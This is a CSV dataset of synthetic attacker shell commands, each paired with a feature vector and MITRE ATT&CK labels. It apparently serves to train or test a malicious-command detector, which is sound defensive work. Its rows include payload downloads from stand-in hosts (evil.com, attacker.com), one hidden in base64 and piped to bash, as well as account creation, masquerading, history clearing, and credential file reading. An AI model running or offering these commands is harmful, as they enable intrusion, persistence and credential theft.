command,features,label,source
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
time echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhlICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1132_Data_Encoding'],synthetic
time cp /bin/bash /tmp/sshd ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1036_Masquerading', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3  -c  ""import  base64;  exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe | chmod +x /tmp/payload,"[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0.2, 0.4, 1, 1]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat /tmp/encoded | xxd -r -p,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
"python3 -c ""import subprocess; [subprocess.run(l.strip(),shell=True) for l in open('/tmp/cmds')]""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
